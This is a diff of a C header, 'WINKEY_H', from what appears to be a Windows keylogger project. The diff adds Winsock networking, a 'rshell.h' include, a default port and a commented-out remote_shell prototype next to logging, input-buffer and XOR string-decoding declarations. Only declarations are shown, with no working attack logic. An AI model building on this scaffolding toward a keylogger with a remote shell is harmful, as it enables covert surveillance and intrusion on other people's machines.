@@ -1,20 +1,6 @@
 #ifndef WINKEY_H
 #define WINKEY_H
 
-#include <stdio.h>
-#include <string.h>
-#include <time.h>
-#include <windows.h>
-#include <stdbool.h>
-#include <stdlib.h>
-#include <wchar.h>
-
-#pragma warning(disable:5045)
-
-/* 
-    minimal version facor compilator 
-    0x0A00 -> windows 10
-*/
 #define _WIN32_WINNT 0x0A00
 #define _WIN32_WINNT_WIN10_TH2  0x0A00
 #define _WIN32_WINNT_WIN10_RS1  0x0A00
@@ -22,6 +8,38 @@
 #define _WIN32_WINNT_WIN10_RS3  0x0A02
 #define _WIN32_WINNT_WIN10_RS4  0x0A03
 #define _WIN32_WINNT_WIN10_RS5  0x0A04
+
+#define NTDDI_WIN11_DT 0x0A000007
+
+#pragma warning(disable:5045)
+#pragma warning(disable: 4820)
+#pragma warning(disable: 4548)
+
+#include <winsock2.h>
+#include <ws2tcpip.h>
+
+#include <windows.h>
+
+#include <stdio.h>
+#include <string.h>
+#include <time.h>
+#include <stdbool.h>
+#include <stdlib.h>
+#include <wchar.h>
+
+#include "rshell.h"
+
+
+#pragma comment (lib, "Ws2_32.lib")
+
+/* 
+    minimal version facor compilator 
+    0x0A00 -> windows 10
+*/
+
+#define DEFAULT_BUFLEN 512
+#define DEFAULT_PORT "27015"
+#define MAX_CLIENTS 64
 
 extern HWND LOG_FD;
 
@@ -76,5 +94,7 @@ void    input_clean_buffer(void);
 void    input_add_string(char *str);
 
 unsigned char *XorStrings(char *enc);
+
+// int remote_shell(void);
 
 #endif
